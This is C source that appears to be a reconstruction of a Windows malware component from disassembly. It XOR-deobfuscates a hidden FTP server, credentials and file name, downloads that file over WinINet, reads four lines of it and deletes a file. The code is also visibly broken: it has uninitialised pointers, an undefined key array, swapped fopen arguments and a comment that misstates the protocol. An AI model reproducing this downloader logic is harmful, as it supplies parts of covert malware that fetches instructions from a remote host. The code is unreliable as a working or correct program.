#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>

int deobfuscate(char* from, char* to);
int ConnectAndGetFile(char* szPassword,
                      char* szUserName,
                      char* szServerName,
                      char* szRemoteFile,
                      char* read1,
                      char* read2,
                      char* read3,
                      char* read4);

int byte40e300[4] = { 0x58, 0x17, 0x7a, 0x70 }; //

int main(int argc, char** argv)
{

    char* unk40e000;
    char* szServerName;

    deobfuscate(unk40e000, szServerName);

    char* unk40e100;
    char* szUserName;

    deobfuscate(unk40e100, szUserName);

    char* unk40e200;
    char* szPassword;

    deobfuscate(unk40e200, szPassword);

    char* unk40e300;
    char* szRemoteFile;

    deobfuscate(unk40e300, szRemoteFile);

    char* unk40f860;
    char* unk40fc60;
    char* fileName;
    char* unk410260;

    ConnectAndGetFile(szPassword, szUserName, szServerName, szRemoteFile, unk40f860, unk40fc60, fileName, unk410260);

    // delete the file with name fileName
    // that was read from the input file
    DeleteFile(fileName);

    return 0;
}

/**
 * @brief This method deobfuscates the input bytes to the output ones
 * using the deobfuscation algorithm.
 */
int deobfuscate(char *from, char *to) {
	
	// find last element of input char array
	int cnt = 0;
	
	while (from[cnt] != 0)
		cnt++;
         
	int reverseCnt = cnt - 1;
 
	cnt = 0;

	// from last to first element of input char array
	// deobfuscate and add to output array
	while (reverseCnt > 0) {
		char readvalue = from[reverseCnt];
  
		// produces index number 0<=i<=3
		int index = reverseCnt & 0x80000003;

		if (index < 0)
			index = ((index - 1) | -3) + 1;

		// deobfuscate value
		char deobfvalue = ((readvalue ^ key[index]) & 0x7F);
		
		to[cnt] = deobfvalue;
		reverseCnt--;
		cnt++;
	}
	return 1;
}


/**
 * @brief This method connects to an SFTP-server using the parm credentials and downloads the file
 * given as parm. It opens the file and reads its contents, populating the output parameters with
 * the content of the lines of the file.
 */
int ConnectAndGetFile(char* szPassword,
                      char* szUserName,
                      char* szServerName,
                      char* szRemoteFile,
                      char* read1,
                      char* read2,
                      char* read3,
                      char* read4)
{

    HANDLE internetHandle;
    HINTERNET internetConnect;
    boolean succeed;

    const char word40c180[1] = { 0x72 };

    const char als[1] = { 0x0a };
    const char als1[1] = { 0x0a };
    const char als2[1] = { 0x0a };
    const char als3[1] = { 0x0a };

    int ret = InternetAttemptConnect(0);

    if(ret != 0)
	return -1;

    internetHandle = InternetOpen(0, 0, 0, 0, 0);
    internetConnect = InternetConnect(internetHandle, szServerName, 0x15, szUserName, szPassword, 0x01, 0x80000000, 0);
    succeed = FtpGetFile(internetConnect, szRemoteFile, szRemoteFile, 0, 0x20, 0x01, 0x00);

    FILE* file = fopen(word40c180, szRemoteFile);

    // read the 4 lines of the file
    fscanf(file, als, read1);
    fscanf(file, als1, read2);
    fscanf(file, als2, read3);
    fscanf(file, als3, read4);

    // close the file
    fclose(file);

    // close internet handles
    InternetCloseHandle(internetConnect);
    InternetCloseHandle(internetHandle);

    return 1;
}
